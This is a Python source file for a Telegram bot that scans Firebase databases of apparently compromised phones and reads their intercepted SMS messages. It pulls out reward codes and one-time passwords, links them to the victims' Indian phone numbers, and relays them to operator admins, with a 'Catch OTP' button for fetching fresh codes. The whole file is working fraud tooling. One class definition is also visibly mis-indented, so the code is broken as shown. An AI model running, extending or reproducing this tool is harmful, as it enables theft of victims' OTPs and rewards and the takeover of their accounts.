#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Big City Reward Bot — Firebase + Telegram, multi-admin"""

import json, os, re, sys, time, threading, html, uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

sys.stdout.reconfigure(encoding="utf-8")
import functools
print = functools.partial(print, flush=True)

BRAND_NAME = "Big City Reward Bot"
REDEEM_URL = "https://www.golddropwins.com/"

BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
ADMIN_ID  = int(os.getenv("ADMIN_ID", "0") or 0)
INTERVAL  = int(os.getenv("INTERVAL", "15") or 15)
CODE_LEN  = int(os.getenv("CODE_LEN", "12") or 12)
FIREBASE_DBS_ENV = os.getenv("FIREBASE_DBS", "").strip()

DATA_DIR = os.getenv("DATA_DIR", "").strip()
if DATA_DIR:
    os.makedirs(DATA_DIR, exist_ok=True)
else:
    DATA_DIR = os.path.dirname(os.path.abspath(__file__))

ADMINS_FILE = os.path.join(DATA_DIR, "admins.json")
DBS_FILE    = os.path.join(DATA_DIR, "bot_dbs.json")
SEEN_FILE   = os.path.join(DATA_DIR, "bot_seen.json")
REWARD_LOG  = os.path.join(DATA_DIR, "bot_rewards.txt")

BASE_LAST = 30
POLL_LAST = 10
WORKERS   = 20

OTP_PATTERNS = [
    re.compile(r"OTP[^\d]{0,15}(\d{4,8})", re.I),
    re.compile(r"(\d{4,8})[^\d]{0,15}OTP", re.I),
    re.compile(r"\b(\d{6,7})\b"), 
]

def reward_patterns(code_len):
    return [
        re.compile(rf"Reward\s*Code\s*is\s*\*?\s*([A-Z0-9]{{{code_len}}})\b", re.I),
        re.compile(rf"Reward\s*Code[^\w]{{0,20}}([A-Z0-9]{{{code_len}}})\b", re.I),
        re.compile(rf"Reward\s*Code\s*is\s*\*?\s*([A-Za-z0-9]{{8,20}})\b", re.I),
    ]

def parse_env_dbs():
    out = []
    if not FIREBASE_DBS_ENV: return out
    items = [x.strip() for x in re.split(r"[,\n]", FIREBASE_DBS_ENV) if x.strip()]
    for item in items:
        if "|||" in item:
            url, key = [x.strip() for x in item.split("|||", 1)]
        else:
            url, key = item, ""
        if url.startswith("http"):
            out.append({"url": url.rstrip("/"), "key": key, "added_at": int(time.time()), "source": "env"})
    return out

def load_dbs():
    file_dbs = []
    if os.path.exists(DBS_FILE):
        try:
            with open(DBS_FILE, encoding="utf-8") as f:
                d = json.load(f)
                if isinstance(d, list): file_dbs = d
        except Exception: pass
    env_dbs = parse_env_dbs()
    merged, seen = [], set()
    for d in env_dbs + file_dbs:
        u = d.get("url", "").rstrip("/")
        if u and u not in seen:
            merged.append({"url": u, "key": d.get("key", ""), "added_at": d.get("added_at", int(time.time())), "source": d.get("source", "bot")})
            seen.add(u)
    return merged

def save_dbs(dbs):
    try:
        bot_only = [d for d in dbs if d.get("source") != "env"]
        with open(DBS_FILE, "w", encoding="utf-8") as f: json.dump(bot_only, f, indent=2)
    except Exception as e: print(f"[dbs] save err: {e}")

def load_seen():
    try:
        with open(SEEN_FILE, encoding="utf-8") as f: return set(json.load(f))
    except Exception: return set()

def save_seen(seen):
    try:
        with open(SEEN_FILE, "w", encoding="utf-8") as f: json.dump(sorted(seen), f)
    except Exception: pass

def extract_reward(text, code_len):
    for rx in reward_patterns(code_len):
        m = rx.search(text or "")
        if m: return m.group(1).rstrip(".*")
    return ""

def extract_otp(text):
    t = (text or "").lower()
    if "reward" in t and "code" in t: return "" 
    for rx in OTP_PATTERNS:
        m = rx.search(text or "")
        if m: return m.group(1)
    return ""

def is_hit(sender, text):
    s = (sender or "").lower()
    t = (text or "").lower()
    return ("golddrop" in s or "gold drop" in s or "bigcity" in s or "golddrop" in t or "gold drop" in t or "golddropwins" in t or "bigcity" in t or "big city" in t)

def extract_phone(dev):
    def valid(m):
        m = re.sub(r"[^0-9]", "", str(m or ""))
        return m if len(m) == 10 and m[0] in "6789" else ""
    if not isinstance(dev, dict): return ""
    for k in ("mobNo", "phoneNumber", "phone", "mobile", "msisdn", "subId", "number", "simNumber"):
        if dev.get(k):
            r = valid(dev[k])
            if r: return r
    for c in ("sims", "action", "sms", "smsCommand", "webhookEvent", "sendSms", "commands", "sim"):
        cont = dev.get(c)
        items = (list(cont.values()) + [cont]) if isinstance(cont, dict) else (cont if isinstance(cont, list) else [])
        for it in items:
            if isinstance(it, dict):
                for k in ("phoneNumber", "number", "phone", "msisdn", "to", "mobile", "subId"):
                    if it.get(k):
                        r = valid(it[k])
                        if r: return r
    return ""

def fb_get(session, base, path, key=""):
    url = f"{base}/{path}"
    if key: url += f"?auth={key}" if "?" not in url else f"&auth={key}"
    try:
        r = session.get(url, timeout=10)
        if r.status_code == 200: return True, r.json()
        return False, f"HTTP {r.status_code} {r.text[:120]}"
    except Exception as e:
        return False, f"ERR {str(e)[:80]}"

def validate_db(session, url, key=""):
    url = url.rstrip("/")
    ok, data = fb_get(session, url, "clients.json", key)
    if not ok: return False, str(data)[:200]
    if not isinstance(data, dict): return False, "clients empty/invalid"
    return True, f"{len(data)} devices"

def scan_db(session, base, key, last, code_len):
    ok, clients = fb_get(session, base, "clients.json", key)
    if not ok: return 0, 0, [], clients
    if not isinstance(clients, dict): return 0, 0, [], "empty clients"

    dev_ids = list(clients.keys())
    phones = {d: extract_phone(clients[d]) for d in dev_ids}

    def fetch(did):
        ok2, data = fb_get(session, base, f"messages/{did}.json?orderBy=\"$key\"&limitToLast={last}", key)
        return did, ok2, data

    msgs, hits = 0, []
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = {ex.submit(fetch, d): d for d in dev_ids}
        for fu in as_completed(futs):
            did = futs[fu]
            try:
                _, ok2, data = fu.result()
            except Exception: continue
            if not ok2 or not isinstance(data, dict): continue
            for mk, m in data.items():
                if not isinstance(m, dict): continue
                text = str(m.get("message", "") or m.get("body", "") or m.get("text", ""))
                sender = str(m.get("sender", "") or m.get("from", "") or m.get("address", ""))
                if not text.strip(): continue
                msgs += 1
                if is_hit(sender, text):
                    phone = phones.get(did, "")
                    if not phone: phone = extract_phone(m)
                    
                    hits.append({
                        "db": base, "device": did, "phone": phone,
                        "key": f"{base}|{did}|{mk}", "msgid": str(mk),
                        "sender": sender, "ts": str(m.get("dateTime", "") or m.get("time", "") or m.get("timestamp", "")),
                        "text": text, "otp": extract_otp(text), "reward": extract_reward(text, code_len),
                    })
    return len(dev_ids), msgs, hits, ""
    class GoldBot:
    def __init__(self, session):
        self.session   = session
        self.token     = BOT_TOKEN
        self.interval  = INTERVAL
        self.code_len  = CODE_LEN
        self.api       = f"https://api.telegram.org/bot{self.token}"
        self.dbs       = load_dbs()
        self.seen      = load_seen()
        self.offset    = 0
        self.started   = time.time()
        self.last_scan = 0
        self.scan_lock = threading.Lock()
        self._stop     = threading.Event()
        self._scan_now = threading.Event()
        self.otp_context = {} 

        self.super_admin = ADMIN_ID
        self.regular_admins = set()
        self._load_admins()
        self._verify_bot()

    def _load_admins(self):
        try:
            with open(ADMINS_FILE, encoding="utf-8") as f:
                d = json.load(f)
            if not self.super_admin: self.super_admin = int(d.get("super_admin", 0) or 0)
            self.regular_admins = set(int(x) for x in d.get("admins", []))
        except (FileNotFoundError, json.JSONDecodeError): pass

    def _save_admins(self):
        try:
            with open(ADMINS_FILE, "w", encoding="utf-8") as f:
                json.dump({"super_admin": self.super_admin, "admins": sorted(self.regular_admins)}, f, indent=2)
        except Exception as e: print(f"[admins] save err: {e}")

    def is_super(self, uid): return uid == self.super_admin
    def is_admin(self, uid): return uid == self.super_admin or uid in self.regular_admins

    def _verify_bot(self):
        try:
            r = self.session.get(f"{self.api}/getMe", timeout=10).json()
        except Exception as e:
            print(f"[bot] getMe err: {e}"); sys.exit(1)
        if not r.get("ok"):
            print(f"[bot] token invalid: {r}"); sys.exit(1)
        self.bot_username = r["result"]["username"]
        print(f"[bot] connected @{self.bot_username}")

    def send(self, chat_id, text, reply_to=None, reply_markup=None):
        try:
            payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True}
            if reply_to: payload["reply_to_message_id"] = reply_to
            if reply_markup is not None: payload["reply_markup"] = reply_markup
            r = self.session.post(f"{self.api}/sendMessage", json=payload, timeout=15)
            return r.status_code == 200
        except Exception as e:
            print(f"[tg] send err: {e}"); return False

    def answer_cb(self, cb_id, text="", show_alert=False):
        try:
            self.session.post(f"{self.api}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": text, "show_alert": show_alert}, timeout=10)
        except Exception: pass

    def brand(self): return f"━━━━━━━━━━━━━━━━━━━━\n🏙 <b>{BRAND_NAME}</b>"

    def poll_loop(self):
        while not self._stop.is_set():
            try:
                r = self.session.get(f"{self.api}/getUpdates", params={"offset": self.offset, "timeout": 30}, timeout=40).json()
                if not r.get("ok"): time.sleep(5); continue
                for u in r["result"]:
                    self.offset = u["update_id"] + 1
                    try: self.handle_update(u)
                    except Exception as e: print(f"[handle] {e}")
            except requests.exceptions.ReadTimeout: continue
            except Exception as e: print(f"[poll] {e}"); time.sleep(3)

    def handle_update(self, u):
        if "callback_query" in u:
            try: self.handle_callback(u["callback_query"])
            except Exception as e: print(f"[cb] {e}")
            return

        msg = u.get("message")
        if not msg: return
        chat_id = msg["chat"]["id"]
        text = (msg.get("text") or "").strip()
        if not text: return

        first_line = text.split("\n", 1)[0]
        parts = first_line.split(None, 1)
        cmd = parts[0].split("@")[0].lower() if parts else ""
        args = text[len(parts[0]):].strip() if parts else ""

        if cmd == "/id": return self.send(chat_id, f"🆔 Your ID: <code>{chat_id}</code>")

        if not self.super_admin:
            if cmd == "/start":
                self.super_admin = chat_id
                self._save_admins()
                return self.send(chat_id, f"👑 <b>You are now super admin!</b>\n\nYour ID: <code>{chat_id}</code>\n\nSet env <code>ADMIN_ID={chat_id}</code> in Railway.\n\n{self.brand()}")
            return

        if not self.is_admin(chat_id): return self.send(chat_id, "⛔ Unauthorized.")

        routes = {"/start": self.cmd_start, "/help": self.cmd_start, "/add": self.cmd_add, "/del": self.cmd_del, "/remove": self.cmd_del, "/list": self.cmd_list, "/run": self.cmd_run, "/status": self.cmd_status, "/interval": self.cmd_interval, "/rewards": self.cmd_rewards, "/clearseen": self.cmd_clearseen}
        super_routes = {"/addadmin": self.cmd_addadmin, "/deladmin": self.cmd_deladmin, "/admins": self.cmd_admins}

        if cmd in super_routes:
            if not self.is_super(chat_id): return self.send(chat_id, "⛔ Only super admin can manage admins.")
            super_routes[cmd](chat_id, args, msg.get("message_id"))
        elif cmd in routes:
            routes[cmd](chat_id, args, msg.get("message_id"))

    def cmd_start(self, cid, args, mid):
        role = "👑 <b>Super Admin</b>" if self.is_super(cid) else "🔧 <b>Admin</b>"
        text = (f"🏙 <b>{BRAND_NAME}</b>\n\n{role}\n📁 DBs: <b>{len(self.dbs)}</b>  |  ⏱ {self.interval}s  |  🔑 len={self.code_len}\n\n"
                f"<b>Commands:</b>\n/add — add DB(s)\n/del — remove DB\n/list — list DBs\n/run — force scan\n/status — stats\n/interval — change interval\n/rewards — last codes\n/id — your ID\n")
        if self.is_super(cid): text += f"\n<b>Admin mgmt:</b>\n/addadmin &lt;id&gt;\n/deladmin &lt;id&gt;\n/admins\n"
        self.send(cid, text + f"\n{self.brand()}")

    def cmd_add(self, cid, args, mid):
        if not args: return self.send(cid, "📥 <b>Add DBs:</b>\n<code>/add url1\nurl2 ||| key</code>")
        items = []
        for line in args.splitlines():
            line = line.strip()
            if not line: continue
            if "|||" in line: items.append(line)
            else:
                for x in re.split(r"[\s,]+", line):
                    if x.startswith("http"): items.append(x)
        if not items: return self.send(cid, "❌ No valid URL.")

        added, failed, existed = [], [], []
        for item in items:
            if "|||" in item: url, key = [x.strip() for x in item.split("|||", 1)]
            else: url, key = item.strip(), ""
            url = url.rstrip("/")
            if any(d["url"] == url for d in self.dbs): existed.append(url); continue
            ok, info = validate_db(self.session, url, key)
            if not ok: failed.append(f"<code>{html.escape(url)}</code> → {html.escape(str(info))}"); continue
            self.dbs.append({"url": url, "key": key, "added_at": int(time.time()), "source": "bot"})
            added.append(f"<code>{html.escape(url)}</code> <i>({info})</i>")
        save_dbs(self.dbs)

        parts = []
        if added: parts.append(f"✅ <b>Added ({len(added)}):</b>\n" + "\n".join(added))
        if existed: parts.append(f"⚠️ <b>Exists ({len(existed)}):</b>\n" + "\n".join(f"<code>{html.escape(x)}</code>" for x in existed))
        if failed: parts.append(f"❌ <b>Failed ({len(failed)}):</b>\n" + "\n".join(failed))
        parts.append(f"📊 <b>Total:</b> {len(self.dbs)}")
        self.send(cid, "\n\n".join(parts))

    def cmd_del(self, cid, args, mid):
        if not self.dbs: return self.send(cid, "📭 No DBs.")
        if not args: return self.send(cid, "Usage: <code>/del 1 3 5</code>")
        nums = []
        for x in re.split(r"[\s,]+", args):
            try: nums.append(int(x))
            except ValueError: pass
        if not nums: return self.send(cid, "❌ No valid numbers.")

        valid = sorted(set(n for n in nums if 1 <= n <= len(self.dbs)))
        invalid = [n for n in nums if not (1 <= n <= len(self.dbs))]
        if not valid: return self.send(cid, f"❌ Use 1-{len(self.dbs)}")

        removed = []
        for n in sorted(valid, reverse=True): removed.append(self.dbs.pop(n - 1))
        save_dbs(self.dbs)

        lines = [f"🗑 <b>Removed {len(removed)}:</b>\n"]
        for d in removed:
            warn = " <i>(env)</i>" if d.get("source") == "env" else ""
            lines.append(f"• <code>{html.escape(d['url'])}</code>{warn}")
        if invalid: lines.append(f"\n⚠️ Invalid: {', '.join(map(str, invalid))}")
        lines.append(f"\n📊 Remaining: <b>{len(self.dbs)}</b>")
        self.send(cid, "\n".join(lines))

    def cmd_list(self, cid, args, mid):
        if not self.dbs: return self.send(cid, "📭 No DBs.")
        text = f"📋 <b>DBs ({len(self.dbs)}):</b>\n\n"
        for i, d in enumerate(self.dbs, 1):
            tag = "🌐" if d.get("source") == "env" else "🤖"
            k = " 🔑" if d.get("key") else ""
            text += f"{i}. {tag}{k} <code>{html.escape(d['url'])}</code>\n"
        text += "\n<i>Use /del 1 3 5 to remove</i>"
        self.send(cid, text)

    def cmd_run(self, cid, args, mid):
        self.send(cid, "🔄 Forcing scan...")
        self._scan_now.set()

    def cmd_status(self, cid, args, mid):
        up = int(time.time() - self.started)
        h, rem = divmod(up, 3600); m, s = divmod(rem, 60)
        last = "never" if not self.last_scan else f"{int(time.time()-self.last_scan)}s ago"
        self.send(cid, f"📊 <b>Status</b>\n\n🤖 @{self.bot_username}\n👑 Super: <code>{self.super_admin}</code>\n👥 Admins: {1+len(self.regular_admins)}\n📁 DBs: <b>{len(self.dbs)}</b>\n⏱ Int: {self.interval}s\n📨 Seen: {len(self.seen)}\n🕒 Up: {h}h {m}m {s}s\n👀 Scan: {last}")

    def cmd_interval(self, cid, args, mid):
        if not args: return self.send(cid, f"Current: <b>{self.interval}s</b>")
        try:
            n = int(args.split()[0])
            if not (5 <= n <= 3600): return self.send(cid, "❌ 5-3600s.")
            self.interval = n
            self.send(cid, f"✅ Interval: <b>{n}s</b>")
        except ValueError: self.send(cid, "❌ Invalid.")

    def cmd_rewards(self, cid, args, mid):
        try:
            with open(REWARD_LOG, encoding="utf-8") as f: lines = f.readlines()[-15:]
            if not lines: return self.send(cid, "📭 No rewards.")
            self.send(cid, "🎁 <b>Last rewards:</b>\n\n" + "\n".join(html.escape(x.strip()) for x in lines))
        except FileNotFoundError: self.send(cid, "📭 No rewards.")

    def cmd_clearseen(self, cid, args, mid):
        self.seen = set(); save_seen(self.seen)
        self.send(cid, "✅ Cleared.")

    def cmd_addadmin(self, cid, args, mid):
        if not args: return self.send(cid, "Usage: <code>/addadmin 123456789</code>")
        try: uid = int(args.split()[0])
        except ValueError: return self.send(cid, "❌ Invalid ID.")
        if uid == self.super_admin: return self.send(cid, "⚠️ Already super.")
        if uid in self.regular_admins: return self.send(cid, "⚠️ Already admin.")
        self.regular_admins.add(uid); self._save_admins()
        self.send(cid, f"✅ Admin added: <code>{uid}</code>\nTotal: {1 + len(self.regular_admins)}")

    def cmd_deladmin(self, cid, args, mid):
        if not args: return self.send(cid, "Usage: <code>/deladmin 123456789</code>")
        try: uid = int(args.split()[0])
        except ValueError: return self.send(cid, "❌ Invalid.")
        if uid == self.super_admin: return self.send(cid, "⚠️ Cannot remove super.")
        if uid not in self.regular_admins: return self.send(cid, "⚠️ Not admin.")
        self.regular_admins.discard(uid); self._save_admins()
        self.send(cid, f"🗑 Admin removed: <code>{uid}</code>")

    def cmd_admins(self, cid, args, mid):
        lines = [f"👥 <b>Admins</b>\n\n👑 Super: <code>{self.super_admin}</code>"]
        if self.regular_admins:
            lines.append(f"\n🔧 Regular ({len(self.regular_admins)}):")
            for a in sorted(self.regular_admins): lines.append(f"• <code>{a}</code>")
        else: lines.append("\n<i>No regular admins.</i>")
        self.send(cid, "\n".join(lines))

    def handle_callback(self, cq):
        cid = cq["message"]["chat"]["id"]
        from_id = cq["from"]["id"]
        data = cq["data"]

        if not self.is_admin(from_id):
            return self.answer_cb(cq["id"], "⛔ Unauthorized", show_alert=True)

        if data.startswith("catchotp:"):
            ctx_id = data.split(":")[1]
            ctx = self.otp_context.get(ctx_id)
            if not ctx:
                return self.answer_cb(cq["id"], "❌ Context expired. Wait for a new code.", show_alert=True)

            self.answer_cb(cq["id"], "🔍 Fetching latest OTP...")
            
            ok, msgs = fb_get(self.session, ctx["db"], f"messages/{ctx['device']}.json?orderBy=\"$key\"&limitToLast=20", ctx["key"])
            if not ok or not isinstance(msgs, dict):
                return self.send(cid, "❌ Firebase error while fetching OTP.")

            otp_found = ""
            otp_text = ""
            for mk in sorted(msgs.keys(), reverse=True):
                m = msgs[mk]
                if not isinstance(m, dict): continue
                t = str(m.get("message", "") or m.get("body", "") or m.get("text", ""))
                
                if re.search(r"reward\s*code", t, re.I): continue
                    
                o = extract_otp(t)
                if o:
                    otp_found = o
                    otp_text = t
                    break
            
            if otp_found:
                if ctx['phone']:
                    phone_disp = f"+91 <code>{html.escape(ctx['phone'])}</code>"
                else:
                    phone_disp = f"⚠️ <i>Unknown</i> (ID: <code>{html.escape(ctx['device'][:10])}...</code>)"
                    
                self.send(cid, f"🔑 <b>OTP Caught!</b>\n\n"
                               f"📱 <b>Number:</b> {phone_disp}\n"
                               f"🔢 <b>OTP:</b> <code>{html.escape(otp_found)}</code>\n\n"
                               f"<i>Msg: {html.escape(otp_text[:200])}</i>\n\n{self.brand()}")
            else:
                self.send(cid, f"📭 No OTP found yet for this number.\nTry again after a few seconds.\n\n{self.brand()}")

    def deliver(self, h):
        if not h["reward"]: return

        clen = len(h["reward"])
        warn = "" if clen == self.code_len else f"\n⚠️ len={clen} (expected {self.code_len})"
        
        if h['phone']:
            phone_text = f"+91 <code>{html.escape(h['phone'])}</code>"
        else:
            phone_text = f"⚠️ <b>Unknown Number</b>\n🆔 ID: <code>{html.escape(h['device'])}</code>"
        
        ctx_id = str(uuid.uuid4())[:8]
        self.otp_context[ctx_id] = h
        if len(self.otp_context) > 1000: self.otp_context.clear()

        text = (f"🎁🎁 <b>REWARD CODE!</b>\n\n"
                f"📱 <b>Number:</b> {phone_text}\n"
                f"🔑 <b>Code:</b> <code>{html.escape(h['reward'])}</code>{warn}\n"
                f"🌐 <b>Redeem:</b> {REDEEM_URL}\n\n"
                f"📩 <i>{html.escape(h['text'][:200])}</i>\n\n"
                f"🕒 {html.escape(h['ts'] or '-')}\n"
                f"{self.brand()}")
        
        markup = {"inline_keyboard": [[{"text": "🔑 Catch OTP", "callback_data": f"catchotp:{ctx_id}"}]]}

        targets = set(self.regular_admins)
        if self.super_admin: targets.add(self.super_admin)
        for uid in targets:
            self.send(uid, text, reply_markup=markup)

        self.log_reward(h)

    def log_reward(self, h):
        try:
            with open(REWARD_LOG, "a", encoding="utf-8") as f:
                f.write(f"{h['ts']} | +91{h['phone'] or '?'} | {h['reward']} | len={len(h['reward'])} | {h['sender']} | {h['device']} | {h['db']}\n")
        except Exception: pass

    def scan_all(self, is_startup=False):
        if not self.scan_lock.acquire(blocking=False): return
        try:
            self.last_scan = time.time()
            for d in list(self.dbs):
                base = d["url"]; key = d.get("key", "")
                last = BASE_LAST if is_startup else POLL_LAST
                try:
                    _, _, hits, _ = scan_db(self.session, base, key, last, self.code_len)
                except Exception as e:
                    print(f"[scan] {base[:40]}: {e}"); continue
                
                fresh = [h for h in hits if h["key"] not in self.seen]
                
                for h in sorted(fresh, key=lambda x: x["msgid"]):
                    self.seen.add(h["key"])
                    if not is_startup: self.deliver(h)
                
                if fresh: save_seen(self.seen)
        finally:
            self.scan_lock.release()

    def monitor_loop(self):
        print("[scan] Initial sync (silent)...")
        self.scan_all(is_startup=True)
        print("[scan] Live monitoring started...")
        while not self._stop.is_set():
            if self._scan_now.wait(timeout=self.interval): self._scan_now.clear()
            self.scan_all(is_startup=False)

    def stop(self):
        self._stop.set()
        save_seen(self.seen); save_dbs(self.dbs); self._save_admins()

def main():
    print("=" * 60)
    print(f"  {BRAND_NAME} — Railway")
    print(f"  Data: {DATA_DIR}")
    print("=" * 60)

    if not BOT_TOKEN: print("[!] BOT_TOKEN env missing"); sys.exit(1)

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    bot = GoldBot(session)
    mon = threading.Thread(target=bot.monitor_loop, daemon=True)
    mon.start()

    if bot.super_admin:
        bot.send(bot.super_admin, f"✅ <b>Bot restarted</b>\nDBs: {len(bot.dbs)}\n\n{bot.brand()}")

    try: bot.poll_loop()
    except KeyboardInterrupt: print("\n[!] Shutting down...")
    finally: bot.stop()

if __name__ == "__main__":
    main()
